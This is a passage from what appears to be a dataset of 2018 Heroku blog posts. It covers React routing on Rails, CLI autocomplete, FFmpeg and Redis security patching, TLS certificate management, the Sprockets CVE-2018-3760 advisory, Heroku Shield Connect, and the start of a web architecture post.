client/src/App.js , and add in some routing: import React, { Component } from 'react'\nimport { BrowserRouter as Router, Route, Switch } from 'react-router-dom'\nimport Home from './Home'\nimport NotFound from './NotFound'\n\nclass App extends Component {\n  render () {\n    return <Router>\n      <Switch>\n        <Route path='/' exact component={Home} />\n        <Route component={NotFound} />\n      </Switch>\n    </Router>\n  }\n}\n\nexport default App Now you can run jump back into your root directly, run bin/rake start , and visit any URL that isn’t the root to get your 404. The very worst 404—no puppies From there, you can add as many routes as you like, and if Rails doesn’t catch them first, they’ll be served by your client. Nice work! To test this on your live app commit your changes and push: git add .\ngit commit -vam \"Added react router\"\ngit push heroku master\nheroku open And visit any random page, like /puppies . You should see your 404, served by Create React App. Nice work! This isn’t exactly the most thrilling demo (tasty as it may be) but hopefully it gets you up and running. All the ingredients to make a delicious Rails API / ActiveAdmin / Create React App flavoured beverage are here, and the sky’s the limit. Again, you can see a ready-to-go repo here, too, including a Heroku button for instant deployment: http://github.com/heroku/list-of-ingredients Thanks for taking the time to have a look, and I genuinely hope you celebrated with a smoothie. Shout out to Roman Rott , Carlos Ramirez III , and Full Stack React for the inspiration to put this together. And a massive thank you to Glen and Xander for taking the time to make suggestions and proofread the first take, and to Chris for working with me on this one. If you have any questions or comments say hi via Twitter . ruby Create React App buildpacks rails api ActiveAdmin", "date": "2018-05-16,"},
{"website": "Heroku", "title": "Announcing Heroku CLI Autocomplete for Bash and Zsh", "author": ["Nahid Samsami"], "link": "https://blog.heroku.com/announcing-cli-autocomplete", "abstract": "Announcing Heroku CLI Autocomplete for Bash and Zsh Posted by Nahid Samsami May 24, 2018 Listen to this article Today we're excited to announce that Heroku CLI Autocomplete for Bash and Zsh is generally available. Heroku CLI Autocomplete makes your workflow faster and more seamless by helping you complete command and flag names when you press the tab key. Autocomplete completes all Heroku CLI commands and will automatically support new commands as they are added. You can also complete values for some flags and args—including apps, pipelines and config vars—so you won't need to run multiple commands to find and cross-reference them. We build the CLI first and foremost for human usability; Autocomplete takes usability a step further, making it easier than ever to discover, learn, and interact with each aspect of the CLI. CLI Autocomplete Features Below are examples of the three different types of completions. Note that these examples are all in Zsh and that descriptions are not supported in Bash. Command Name Completion You can start writing a command and then press tab to see the different possibilities for completing it. Flag Name Completion Most CLI commands make use of flags to provide additional input. Flags are prefaced with two dashes ( -- ), such as --app . Some commands have many flags and remembering them can be difficult. You can easily view all available flags for each command by typing -- and then the tab key. Flag Value Completion Most flags require you to provide a value. For example, --app requires you to specify the name of an app. With Autocomplete, you can complete values for many popular flags, including --app , --pipeline , --space , and --team . Completion for Config Vars and Add-on Names You can complete config vars and add-on names when the CLI knows the app. The CLI can infer the app via the git remote or you can provide the app name via a flag. Getting Started To get started, update your CLI, install the @heroku-cli/plugin-autocomplete plugin and run the setup: $ heroku update && heroku plugins:install autocomplete && heroku autocomplete You may choose to run the install and setup commands separately if you prefer: $ heroku update\n$ heroku plugins:install autocomplete\n$ heroku autocomplete The specific instructions you'll receive depend on whether you are using Bash or Zsh. After you finish setup, Autocomplete is ready to use with the tab key. We are not planning to support shells besides Bash and Zsh at this time. Autocomplete and oclif As we announced earlier this year, the Heroku and Salesforce CLIs are built upon an open source framework: oclif .  We're incorporating what we've learned developing Heroku CLI Autocomplete into an oclif plugin. oclif developers can learn more about trying out this feature in our oclif Gitter. Feedback We hope you enjoy using Heroku CLI Autocomplete as much as we do. Please send us feedback to ecosystem-feedback@heroku.com . CLI Autocomplete Heroku CLI oclif plugins", "date": "2018-05-24,"},
{"website": "Heroku", "title": "Securing Dependencies for Rails 5.2 Active Storage", "author": ["Craig Ingram"], "link": "https://blog.heroku.com/security-rails-active-storage", "abstract": "Securing Dependencies for Rails 5.2 Active Storage Posted by Craig Ingram May 22, 2018 Listen to this article The Public Cloud Security (PCS) group at Salesforce partners very closely with Heroku engineering to review and advise on new product features across the platform, from infrastructure to applications. One of the most rewarding aspects about this partnership and working on this team for me is when we not only identify security concerns, but take an active role in building safe solutions. Heroku recently announced support for Active Storage in Rails 5.2, which introduces the ability to generate previews of PDFs and videos. As a security engineer, hearing about a new feature in a product that automatically parses media files definitely grabbed my attention. This post takes a look at challenges in supporting Active Storage on Heroku from a security perspective, and how engineering teams and PCS work together to build safe solutions for our customers. FFmpeg's History FFmpeg is a tool for handling a wide variety of video and audio files through many libraries and plugins that expand its support for different formats. FFmpeg's power and flexibility make it a popular choice for many different projects, so it's no surprise that the Rails team chose it for handling generation of preview images from video files. FFmpeg has a long history of publicly disclosed vulnerabilities, with many resulting in code execution. It's a popular target for fuzzers which have been the source of many of these vulnerability discoveries. Raw CVE count isn't a great metric to determine whether a piece of software is secure or not, but it does show us that this is an attractive target for researchers, and gives us an idea of how frequently we'd need to be concerned about deploying patches for security issues. Perhaps a more accurate metric is how quickly the FFmpeg team responds to security issues. In a 2015 article about Debian returning to use FFmpeg, security researcher Mateusz “j00ru” Jurczyk had fantastic praise for the FFmpeg team's vulnerability response. “We have been quite successful working on the above effort with FFmpeg for the last ~3.5 years: every single issue we have found (even the least severe ones) has been fixed in a timely manner.” Source: Why Debian returned to FFmpeg by Jonathan Corbet The commitment from the upstream project to address security issues big and small gave us confidence to move forward with including support for FFmpeg. Timely triaging and applying application patches in Heroku stack images and buildpacks is a well tested process at Heroku, so we felt comfortable knowing we could quickly get vulnerability patches to customers using Active Storage. Keeping Up With Upstream One of the engineering challenges with supporting Active Storage is that the cedar-14 stack is based on Ubuntu Trusty 14.04, which removed support for FFmpeg in favor of libav . That means it isn't as simple as including Ubuntu's FFmpeg package directly in the stack image. While it may have been possible to try and use libav, consider Jurczyk’s description of that project from the same article linked above. ”The situation is entirely different with Libav, which is still affected by hundreds of such bugs, even though we have provided the developers with reproducing testcases a number of times in the past.” The other problem from a security perspective is that the FFmpeg package for Ubuntu Xenial 16.04 (which heroku-16 is based on) is part of the community maintained Universe repository and was missing backports for several vulnerabilities. We really appreciate the community efforts involved in creating and maintaining backports for a complicated package like FFmpeg, but we were not comfortable in shipping a new feature to customer applications with so many known vulnerabilities. Without the resources to contribute our own backports, this left us with a new challenge - rolling our own FFmpeg binary. A Static Solution While looking at options for the best way to provide customers with the most up to date and secure FFmpeg, I came across an excellent project called sffmpeg that uses CMake to create a static FFmpeg binary. Building a static binary allows us to create a single Debian package that would include any necessary dependencies and work across all of Heroku’s supported stack images. FFmpeg 4.0 had just been released, and sffmpeg was a couple of versions behind. However, there was already a pull request from Jan Spitalnik to upgrade sffmpeg to 4.0, which we were able to use to start our fork . The earlier post mentioned some of the licensing concerns with the PDF dependency, and we faced similar issues with FFMpeg. Luckily for the static build, we were able to easily modify the CMakeLists.txt file to change the build configuration options and external project additions to remove non-free software. This has the added benefit of minimizing the attack surface of FFMpeg by removing unnecessary libraries and dependencies that were included by default in sffmpeg, but not needed for the Active Storage support. Each additional dependency included by FFmpeg to support other media formats is an additional library or tool that could introduce vulnerabilities into customer applications and that we would need to monitor for security patches. By removing things like RTMP stream support or xvid , things that aren’t used by Active Storage, we minimize applications from being vulnerable to issues in unnecessary dependencies. Default Ubuntu install of ffmpeg and dependencies Our sffmpeg fork’s reduced attack surface This reduction in attack surface is apparent when considering that including FFmpeg and the default dependencies would have added around 200MB to an application slug , while the final static build weighed in around 30MB. This approach helps prevent customer applications from hitting the 500MB slug size limits , speeds up customer builds, and reduces our storage requirements for Rails applications. The combination of a clear performance benefit, as well as improving the security story made this an easy choice. With the static build helper generating the latest, patched version of FFmpeg, and stripped down to the minimum dependencies to create a usable Debian package, all that was left to do was automate the build with CI and get it included in the new Active Storage Preview buildpack. Automation is essential for ensuring we can react quickly and roll out updated versions when any new security releases are announced. We are using Docker in CircleCI to run our forked sffmpeg build helper. The build script compiles the static FFmpeg binary with all of its dependencies, adds it to a Debian package (.deb), and then uploads the package to AWS S3. Once uploaded, it can immediately be used by anyone using the Active Storage Preview buildpack . The buildpack installs the Debian package into your application dyno by using the -x option to extract it locally, since dyno’s don’t run as root , and adds it to your dyno’s PATH environment variable to make it accessible to Rails. The CI build and push to S3 takes around 20 minutes, allowing us to get patches out to customers very soon after an upstream release. Conclusion The result of this effort provided us with a version of FFmpeg that contained the latest security patches, with a reduced attack surface and package size, support for all of Heroku’s stack images, and an automated process for staying up to date with future security releases. It is a crucial part of Heroku's engineering culture that security is not a blocker, but an enabler and as such our team strives to help find safe solutions to support products and features that make Heroku the best place to run your code. ffmpeg security ubuntu rails", "date": "2018-05-22,"},
{"website": "Heroku", "title": "Heroku CLI: Completing Autocomplete", "author": ["Philipe Navarro"], "link": "https://blog.heroku.com/completing-autocomplete", "abstract": "Heroku CLI: Completing Autocomplete Posted by Philipe Navarro June 12, 2018 Listen to this article The CLI Team at Heroku strives to create a CLI user experience that is intuitive and productive. We had “build CLI autocomplete” in the icebox of our roadmap for many years. But if we were going to ship it, it had to complement the existing CLI experience. This is challenging because the Heroku CLI is very dynamic: it comprises user installable plugins, and the data needed for completions is behind an API. Recently, we spent some time brainstorming the experience we wanted from Heroku CLI Autocomplete and decided it was time. We took “build autocomplete” out of the icebox and shipped it . This post will discuss the main challenges we faced building Heroku CLI Autocomplete and how we solved them. Challenges Here is a quick overview of each challenge. Plugin-based CLI : The Heroku CLI’s set of commands is extendable using user-installed plugins. This means different CLI users may have different commands installed. Heroku CLI Autocomplete needs to handle command completion for any set of plugins the user has installed. Widely variable shell configurations : Heroku CLI Autocomplete must be resilient to a wide variety of shell configurations and allow us to update the autocomplete code without asking the user to edit their shell configuration files on every update. Completion data behind an API : Whereas most autocomplete systems work with local data like file names and git branches, most of the Heroku CLI data, such as app names or config vars, is behind an API. This data needs to be fetched and cached. Cache invalidation : Using a cache means we need to handle cache invalidation. Without cache invalidation, the completion data might look “stuck in the past” with an inconsistent listing of apps or config vars compared to the API. Contextual command completion : To make autocomplete really useful for more advanced use cases, we wanted it to complete data that can only be known after other bits of data have already been specified. For example, to complete an add-on name, we first have to know for which app, then autocomplete can return the names of add-ons attached to that app. Plugin-based CLI Conceptually, autocomplete is simple. You define a function that is called by the shell's completion system whenever a user prompts for completion assistance—typically by hitting Tab . This function returns possible completion values to the shell’s completion system. The inner working of this function—what completion values to return and when—is where the complexity lurks. Most command line tools' commands, arguments, and values don't change much. For example, below are the options available to the cat command, and the user cannot change these unless they install a different version of cat . The implementation of most autocomplete functions—like autocomplete for cat —is a static file full of case statements. However, one of the Heroku CLI's superpowers is the ability to use plugins to augment its functionality. Users can add and remove plugins, customizing the CLI for their needs. No two users' Heroku CLI can be assumed to be exactly alike. This means we can't just define a static file of case statements. Instead, we need an autocomplete function that is capable of handling any set of Heroku CLI plugins and all associated commands, arguments, and flags. For Heroku CLI Autocomplete, rather than define hundreds of case statements, we define a variable that will contain the appropriate completion value. However, this variable isn’t assigned a value until you ask for completion values (i.e., hit Tab ). In order for that variable to have the appropriate value when you hit Tab there is work we work to do beforehand. When you run heroku autocomplete and see the output Building the autocomplete cache... , the autocomplete cache builder is iterating through all the available commands including commands from the plugins you have installed. As it iterates, we create setters—functions that assign a value to that variable—with all the necessary information to provide completion results for the commands installed. The autocomplete function, when executed with Tab , then calls the appropriate setter to provide a list of all the available commands. Or  determines a command name is already present and uses that command name to call the corresponding setter containing all the needed information for completing that command's flags names or values. This dynamic completion using generated setters facilitates autocomplete's ability to adapt to every user's customized Heroku CLI. Widely Variable Shell Configurations Initial setup of Heroku CLI Autocomplete requires a user to modify their shell profile—the .bashrc or .zshrc file. Adding anything to shell profiles is tricky. Shells are like people's offices. Developers spend a lot of time in them, and their smooth functioning is critical to getting work done. Some are highly customized and decorated. Some are simple. Some use a pre-defined setup (e.g. oh-my-zsh , prezto , or bash-it ). Some are well maintained and others a bit broken. With autocomplete, we are deploying software into a similar environment. We don’t know how it’s going to be set up, we have little control over it, and our attempts to help should never get in the way. We solve this with a shim . During installation, Heroku CLI Autocomplete asks you to source a shim path in your shell profile. This shim is a file under our control in the user's cache directories (more about the XDG Data Directories spec ). If the shim file can't be found because of an unexpected problem, we fail silently so as not to block the user’s workflow. If Heroku CLI Autocomplete doesn’t work, that’s not ideal, but it’s failure should not break other aspects of the user’s shell. Sourcing this shim file also allows us to fix bugs and add features in future updates without the user having to edit their shell profile again. Completion Data Behind an API For most command line tools, the data needed for flag or argument completion is on local disk. For example, git autocomplete gets completion values for branch, remote, and tag names from disk. In contrast, Heroku CLI's flag and argument values are mostly not on disk. Instead, they are behind the Heroku API. This includes app names, config vars, pipelines, and some other values. The autocomplete function fetches these values from the API when you hit Tab . And because network requests can be three orders of magnitude slower than disk reads , we cache these values to disk for future completions. You may notice a completion take slightly longer one time over another, that is likely because the cache was invalidated and a network request was required to repopulate it. Cache Invalidation Since we employ a cache for completion data, we need some mechanism for cache expiration. When we first started building Heroku CLI Autocomplete, we used timers to invalidate the cache—a common practice. But this can cause a confusing user experience in some Heroku CLI use cases. For example, if a user creates a new app and there is an hour remaining on the cache expiration timer, the new app won’t show up in autocomplete results until an hour later. Similarly, if a user deletes an app, that app will continue to show up in autocomplete results until the timer triggers a cache refresh. Cache invalidation is one of the “ two hard things ” in computer science. However, this spring we migrated the Heroku CLI to oclif , our recently open-sourced CLI framework. In doing so, more intelligent cache invalidation became a breeze using oclif's custom hooks . Now, individual commands can emit a custom hook event to which the Heroku CLI Autocomplete plugin can subscribe. The plugin hook then invalidates, and in some cases, rebuilds the appropriate completion cache. Even better, with oclif there is no dependency coupling with custom hooks. If a hook event is fired, but nothing is subscribed to it (e.g. autocomplete is not installed), the CLI lifecycle continues without producing an error. Contextual Command Completion This is the most interesting and complex feature of Heroku CLI Autocomplete and also where it provides a huge benefit. Often, it is difficult to remember an app's exact add-on names or config vars, but the user has to type these values in many CLI commands. Without autocomplete, the solution to this problem is to invoke another CLI command to retrieve the add-on's names or config vars and copy/paste them where needed into the next CLI command. Eliminating this extra manual step was an ideal problem for autocomplete to solve. Solving this was by far the hardest challenge and would require another post to explain fully. But in short, autocomplete reads what has already been typed onto the command line, for example, heroku addons:info --app=serene-hollows-34516 , and parses that to determine the current context. In parsing, we can tell if all arguments are supplied, what flags are present and have been supplied, and then look for additional completion values that could only be known with that parsed context. For example, in the addons:info example mentioned above, the app name, serene-hollows-34516 , is already specified in the command, so we can fetch the app's add-on aliases from the Heroku API and return them as completion values. Moving Forward Many developers are building their own CLI’s on our open source framework, oclif . We're committed to building features for the Heroku CLI as open source components for oclif. To that end, we are incorporating what we have learned developing Heroku CLI Autocomplete into an oclif plugin . Oclif developers can learn more about trying out this plugin in our oclif Gitter . We hope you enjoy using Heroku CLI Autocomplete as much as we do. Please send any feedback to ecosystem-feedback@heroku.com . CLI Autocomplete bash zsh node.js", "date": "2018-06-12,"},
{"website": "Heroku", "title": "An Update on Redis Vulnerabilities and Patching", "author": ["Scott Truitt"], "link": "https://blog.heroku.com/redis-vulnerability", "abstract": "An Update on Redis Vulnerabilities and Patching Posted by Scott Truitt June 13, 2018 Listen to this article On May 10, 2018, we received notice about two critical vulnerabilities in Redis, both embargoed until this morning . Upon this notice, our Data Infrastructure team proceeded to patch all internal and customer databases in response to these vulnerabilities. As of today, all customer databases have been patched successfully. At Heroku, customer trust is our most important value - and we are grateful to have your trust in keeping a globally-distributed data fleet safe from harm. If you’re interested in more behind the scenes details, check out our engineering blog post on how our Data Infrastructure team undertook the effort to patch our entire Redis fleet . heroku redis", "date": "2018-06-13,"},
{"website": "Heroku", "title": "Auto Cert Management and More TLS Options for Private Spaces", "author": ["Michael Friis"], "link": "https://blog.heroku.com/cert-management-private-spaces", "abstract": "Auto Cert Management and More TLS Options for Private Spaces Posted by Michael Friis June 19, 2018 Listen to this article Today we’re announcing two exciting TLS improvements for apps running in Private Spaces —Heroku’s runtime optimized for security-sensitive workloads that require network and tenant isolation: Automated Certificate Management to automatically create, configure, and renew free TLS certificates for custom domains on Private Space apps Expanded and updated cipher suite selections for TLS/SSL termination for Private Space apps Together, ACM and greater TLS cipher suite flexibility makes building secure apps in Heroku Private Spaces simpler and less burdensome. Read on for details. Automated Certificate Management Automated Certificate Management (ACM) is now available at no extra cost for all apps in Heroku Private Spaces. When ACM is enabled on an app, Heroku automatically creates, configures and renews TLS certificates for custom domains you add to the app. TLS certificates are the cryptographic keys that encrypt HTTPS traffic and establish identity so your visitors know they’re not browsing an imposter website. Getting and renewing certs for web sites used to be a chore because certs are hard to handle securely, expire periodically, and require strict validation. All of those problems go away with Heroku ACM. ACM can be enabled using the Heroku Dashboard or the CLI: $ heroku certs:auto:enable -a your-app Then check the certificate status: $ heroku certs:auto -a your-app\n …\n Domain Status Last Updated\n ────────────────────────────────────────\n example.com OK about 1 hour Heroku uses the Let’s Encrypt certificate authority to provision certificates. Let’s Encrypt is run as a public benefit by the Internet Security Research Group with the goal of improving security on the Internet. ACM is not enabled by default. To use ACM, enable it for an app in Heroku Dashboard or with the CLI. If you want to move an app with a manually provisioned cert to ACM, follow the process below. 1. Determine the name of your current manually uploaded certificate $ heroku certs\nName\nnagano-91606 2. Enable ACM for your app $ heroku certs:auto:enable\nEnabling Automatic Certificate Management... done\n=== Your certificate will now be managed by Heroku. Check the status by running heroku certs:auto. 3. Wait for the cert to be issued It's important to wait for this step to complete before proceeding. If you don't your app might incur downtime. $ watch heroku certs:auto 4. Remove the old manually added cert Use the name found in step 1 $ heroku certs:remove --name nagano-91606 Because of the network security controls available in Heroku Private Spaces, ACM cannot be used in some configurations that would block Let’s Encrypt validation requests. Also note that ACM cannot be used to generate certificates for the built-in appname.herokuapp.com address for Private Space apps. Stay tuned for improvements. Heroku customers can still use certs provisioned in other ways, of course, but Heroku ACM makes getting setup with https quick and simple. Dev Center has details on Heroku Automated Certificate Management . Improved TLS Cipher Suite Transport Layer Security (TLS) is the foundational technology that encrypts web traffic on the Internet, and cipher suites are used by clients and servers to negotiate what key-exchange and encryption algorithms to use. We have expanded the cipher-suites available to Private Space apps: spaces-tls-modern : TLS 1.2 - excellent security that works with relatively new browsers and mobile/IoT clients default (no flag or setting): TLSv1.1, TLSv1.2 - good security and compatible with a large range of browsers and clients spaces-tls-legacy : TLSv1, TLSv1.1 and TLSv1.2 - should only be used if backwards compatibility with old clients is required At the time of writing, all of these suites score “A” or better on SSL Labs tests. TLS for Private Space apps is configured using the features command. Make sure you disable any other TLS-related flags and then enable the suite you want for the app: $ heroku features:disable spaces-strict-tls --app your-app\n$ heroku features:enable spaces-tls-modern --app your-app Check out Dev Center for full docs . Dev Center also has details on the cipher-suites used with each setting. The new spaces-tls-legacy suite is the same as the previous default . The previous spaces-strict-tls suite (TLS 1.1 and 1.2, with some accommodations for older clients) is deprecated. Because TLS settings can affect connection behavior for users accessing Heroku apps, we have not changed the cipher suites for any existing Private Space apps. Apps using spaces-strict-tls can keep doing so (but should consider upgrading to spaces-tls-modern ). Only new apps will have the new default suite. Apps created before June 19th 2018 have been given a spaces-tls-legacy flag and will see no change in behavior. If, for any reason, you need a newly created app to behave the same as one that’s using a legacy cipher suite, just go ahead and enable either the spaces-tls-legacy (previous default) or spaces-strict-tls feature . To get the new default behavior, simply remove all TLS-related features (typically spaces-tls-legacy ): heroku features:disable spaces-tls-legacy --app your-app Getting TLS configuration right is critical for running secure apps on the internet. The new cipher suite selection for apps in Heroku Private Spaces gives your access to flexible, secure and up-to-date options that will keep your users data safe.", "date": "2018-06-19,"},
{"website": "Heroku", "title": "Rails Asset Pipeline Directory Traversal Vulnerability (CVE-2018-3760)", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/rails-asset-pipeline-vulnerability", "abstract": "Rails Asset Pipeline Directory Traversal Vulnerability (CVE-2018-3760) Posted by Richard Schneeman June 19, 2018 Listen to this article All previously released versions of Sprockets , the software that powers the Rails asset pipeline, contain a directory traversal vulnerability . This vulnerability has been assigned CVE-2018-3760 . How do I know if I'm affected? Rails applications are vulnerable if they have this setting enabled in their application: # config/environments/production.rb\nconfig.assets.compile = true # setting to true makes your app vulnerable Note: The default value of this setting that ships with Rails in production.rb is false . By default, Rails apps running in production mode are not vulnerable to this exploit. How do I fix it? To remediate this vulnerability, applications can either change the setting above to false or upgrade to the latest version of Sprockets. Heroku highly recommends upgrading to the latest patch release for your version of Sprockets by running bundle update sprockets . Make sure that the update puts your application on one of these Sprockets versions (or newer): 2.12.5 3.7.2 4.0.0.beta8 Here are instructions on how to upgrade your Sprockets version . What was at risk? If your application was targeted using this exploit and you had the assets.compile setting enabled on your production app, it's possible that secrets contained in your repo or your environment variables have been compromised. As a precaution, you may wish to rotate your database credentials, along with any other credentials stored in your application code or environment. Instructions for rotating Heroku data services are below: Rotate Heroku Postgres credentials Rotate Heroku Redis credentials Rotate Heroku Kafka credentials For other add-on partners, please check the specific add-on documentation for instructions on how to rotate credentials. How does the exploit work? Released in CVE-2018-3760 , the directory traversal vulnerability was discovered by Orange Tsai from DEVCORE. To exploit the traversal, the app needs to have their assets set to compile at runtime. When runtime compilation is enabled, a Sprockets server will dynamically check to see if an asset is rendered or not when it receives a request. If Sprockets can't find an already rendered asset, it will try to find and compile an asset that matches the request. The search process is very slow, and as such it is not a recommended best practice for this type of asset management software. The directory traversal vulnerability exploits this search process to fool the Sprockets server. Using a known absolute path to the directory of a source asset, an attacker can craft a URL that convinces Sprockets it is rendering an asset inside one of its permitted paths. Heroku's Involvement The Sprockets issue was reported via the Rails security bug tracker on HackerOne by Orange Tsai . It was passed to the Rails maintainers, who forwarded the issue to Richard Schneeman, the current Sprockets maintainer; Richard Schneeman is also a Heroku employee, and the author of this post. A patch was prepared for all three of the currently supported Sprockets versions: 2, 3, and 4. The patches were reviewed privately by the vulnerability reporter and other Rails core members. When the threat was determined to be sufficiently mitigated, a CVE was drafted, and there was a coordinated release of the CVE and the security patches. When a severe security release that affects customers is announced, the CVE is passed to the Heroku security team and the vulnerability is given a score. Based on that score, the rest of the company determines what steps to take to best protect our customers. At the time of the CVE release, the knowledge of the security vulnerability by a Sprockets core member allowed us to quickly give it a score, and immediately begin developing a plan to communicate mitigation instructions to customers. On June 19, we took the following actions to help ensure that customers likely to be affected were notified of the issue: Updated the Ruby Buildpack to fail builds for applications with runtime asset compilation enabled that are running an affected version of Sprockets . Contacted customers we know to be running Ruby on Rails applications that depend on Sprockets, as determined by our internal dependency tracking tool. Note that this tool may not always generate a complete list of affected applications; even if you did not receive an email, we urge you to carefully check your own dependencies to determine if you are affected. If you cannot upgrade an affected Ruby application at this time but need to deploy, it is possible to regain deploy ability . This method is not recommended as it allows you to continue deploying a vulnerable application. Accolades Thank you to the original reporter of the security issue Orange Tsai, for patiently working with the core team while a release was coordinated. A safe and responsible disclosure ensured that our customers, and the entire Rails ecosystem, were not caught unaware without a security patch. Thank you to the Rails security team for their tireless efforts reproducing and patching security bugs. This is difficult work that goes largely unseen by the general public, and as a result earns far too little appreciation. Thank you to Heroku’s security team, for responding to the threat swiftly to protect our customers. Finally, a thank you in advance to all of our affected customers, for upgrading their Sprockets versions and rotating their credentials. ruby rails sprockets asset pipeline cve vulnerability directory traversal exploit", "date": "2018-06-19,"},
{"website": "Heroku", "title": "Announcing General Availability of Heroku Shield Connect", "author": ["Robert Zare"], "link": "https://blog.heroku.com/announcing-shield-connect", "abstract": "Announcing General Availability of Heroku Shield Connect Posted by Robert Zare June 21, 2018 Listen to this article Today we are pleased to announce general availability of Heroku Shield Connect, the latest addition to our lineup of Heroku Shield services. Heroku Shield , announced last year, enabled new capabilities for Dynos, Postgres databases and Private Spaces that make Heroku suitable for high compliance environments such as those that fall under the Health Insurance Portability and Accountability Act (HIPAA) regulations. Heroku Shield Connect extends this offering by enabling high performance, fully automated, and bi-directional data synchronization between Salesforce and Heroku Postgres for companies that need to build HIPAA-compliant applications - all in a matter of a few clicks. With this major enhancement to Heroku Shield, it's now easier than ever to build high compliance applications and services while seamlessly integrating with Salesforce as the system of record for customer data. Shield Private Dynos and Postgres Shield Private Spaces enable Shield variants of both Dynos and Postgres databases. The Shield Private Dyno includes an encrypted ephemeral file system and restricts SSL termination from using TLS 1.0. Private Shield Postgres further guarantees that data is always encrypted in transit and at rest. Heroku also automatically captures a high volume of security monitoring events for Shield Dynos and databases, which helps meet regulatory requirements without imposing any extra burden on developers. Getting Started Getting started is as easy as provisioning the Heroku Shield Connect plan inside of a Shield Private Space: Once provisioned, the full breadth of Heroku Connect functionality is available to you, with the addition of detailed auditing of all administrative actions. Moreover, the service can be provisioned in any of the six global data centers where Private Spaces are available today. It's important to note that the Heroku Shield Connect plan can only be provisioned inside of a Shield Private Space together with a Shield Postgres instance. Looking Ahead This year, we will continue our focus on Salesforce's value of Trust by supporting additional compliance standards. As always, we look to you, our customers, for input on how to direct and prioritize these efforts. Please contact us with your thoughts. To learn more about Heroku Shield Connect, visit us here and feel free to experiment with the free demo edition . Want to learn more about Heroku Shield Connect? Contact sales Shield HIPAA Heroku Connect", "date": "2018-06-21,"},
{"website": "Heroku", "title": "Rolling the Heroku Redis Fleet", "author": ["Camille Baldock"], "link": "https://blog.heroku.com/rolling-redis-fleet", "abstract": "Rolling the Heroku Redis Fleet Posted by Camille Baldock June 27, 2018 Listen to this article Over the past few weeks, Heroku proactively updated our entire Redis fleet with a version of Redis not vulnerable to CVE-2018-11218 . This was an embargoed vulnerability, so we did this work without notifying our customers about the underlying cause. As always, our goal was to update all Heroku Redis instances well before the embargo expired. As a Data Infrastructure Engineer at Heroku, I wanted to share how we manage large fleet operations such as this one. The most important aspect of our job is keeping customers safe from security vulnerabilities, while also minimizing disruption and downtime. Those two objectives are often at odds with each other, so we work hard to reduce the impact of these kinds of updates. When patching a security vulnerability or doing any fleet-wide operations, there are three main concepts we care about: designing infrastructure components to be immutable, having and following a well-defined operations process, and being aware of and mitigating employee fatigue or burnout. I’ll talk more about each of these in detail, but it's important to first understand how high-availability works with Heroku Redis. Heroku Redis and High Availability All paid Heroku Redis plans have a High Availability (HA) feature. When the primary Redis instance fails, it is automatically replaced with a replica, called a standby. Standbys update asynchronously. This means that any developer using a paid Heroku Redis plan gets HA Redis without having to do any setup or ongoing operations. How does Heroku Patch a Security Vulnerability? Immutable Infrastructure Helps Us Scale The Heroku Data infrastructure team uses the principle of immutable infrastructure. In a traditional mutable server infrastructure, engineers and administrators can SSH into servers and change configurations or upgrade packages manually. These servers are “mutable” because they can change once created. With immutable infrastructure, servers are never modified after they're deployed. If we need to change something, we build new servers from a common image and deploy them as replacements. While mutable infrastructure may work well for smaller fleets, it is not a viable option for us. Heroku manages millions of databases. At that scale, it is not feasible to manage customizations on specific servers unless they are fully-automated through our control planes. Additionally, if we find a change that would benefit one customer, we want to make sure all our customers get the benefit of that change. A Well-Defined Operations Process Minimizes Errors It is important to have a well-defined and clear understanding of our automation code when performing operations on many servers at once. One small error could impact thousands of customers, and leave their application with more downtime than necessary. Here's how we perform a fleet-wide Redis patch: We create a new server image that includes all the changes we need to roll out (security patches, OS upgrades, configuration updates, etc.). We test this image, review the results, and then flag it for release. We replace all High Availability standbys with new ones that use the updated image. Once all standbys are patched: We schedule maintenance for all our customers on paid databases plans; these maintenances are scheduled in their next maintenance window, with a warning of at least three business days. Customers can wait for the scheduled maintenance or run the maintenance ahead of the scheduled time if desired. Ensure the standby is in sync with the primary. This ensures that we do not lose data due to faulty replication. We watch for the correct functioning of a High Availability standby at all times during its lifetime. We page an operator in the rare event of a replication failure that goes unresolved for too long. Break the replication link. This means the standby is no longer following the primary, and is now capable of accepting writes. Push a release. As an addon provider, Heroku Redis updates the config vars on your application to point at the new primary. De-provision the old primary and create a new standby. Customers receive an email first to notify them about the upcoming maintenance and then another to notify them of completion. Once all HA Redis instances are updated, we gradually replace all our hobby plan databases to be running on the updated image. A Focus on Employee Health Helps Us Respond When Needed Most Fleet rolls generally result in more pages for the on-call operator to triage. This is due to the increased likelihood of hitting edge cases we have never seen before and therefore never automated. We work hard at fixing these issues before they cause issues, it's also important to keep an eye on the health of the on-call operator for when they do. We have a few mechanisms to help reduce fatigue and burnout on our team: Our fleet roll code only schedules replacement operations during the current on-call operator's business hours. This limits burnout by reducing the risk of the fleet roll waking them up at night. Our control plane software automatically manages all fleet rolls. We determine a safe concurrency level to prevent too much activity from happening all at once. Outcome In the end, we successfully completed a fleet roll for all Heroku Redis customers within five weeks of the vulnerability notification. We beat the public announcement by a week too. We invest heavily in our people and process to make these kinds of updates both possible and predictable. In fact, we follow a similar process for the rest of Heroku Data infrastructure, including Heroku Postgres and Apache Kafka on Heroku. It's all part of our commitment to provide you with the best possible service. If we do our job well, you won't notice any of this effort, but we take pride in that too. redis high availability cve", "date": "2018-06-27,"},
{"website": "Heroku", "title": "Beyond Web and Worker: Evolution of the Modern Web App on Heroku", "author": ["Chris Castle"], "link": "https://blog.heroku.com/modern-web-app-architecture", "abstract": "Beyond Web and Worker: Evolution of the Modern Web App on Heroku Posted by Chris Castle August 14, 2018 Listen to this article This is the first in a series of blog posts examining the evolution of web app architecture over the past 10 years. This post examines the forces that have driven the architectural changes and a high-level view of a new architecture. In future posts, we’ll zoom in to details of specific parts of the system. The standard web application architecture suitable for many organizations has changed drastically in the past 10 years. Back in Heroku’s early days in 2008, a standard web application architecture consisted of a web process type to respond to HTTP requests, a database to persist data, and a worker process type plus Redis to manage a job queue . Modern web app on Heroku in 2008 Now, in 2018, a website (or mobile app) is the primary way many companies interact with customers. Technology is inextricably woven into the fabric of almost every business. As technology is being tasked to do more for a business, we as developers need new breeds of architectures to start from for the modern web app. Sneak peek: Evolution of the modern web app architecture The Change Drivers How have users’ expectations of computers, phones, and software changed in the past decade? What are the drivers of this change? And what do those changes imply for a new web app architecture? Snappier Web Experiences The constraints of the web’s request / response pattern led to poor user experiences. Imagine if every installed application on your computer had to re-render the entire screen whenever you clicked something! And now—to simulate the web’s latency—add the restriction of using a computer from twenty years ago but running today’s software. This is what much of the web user experience is like. It’s shocking that we put up with it as much as 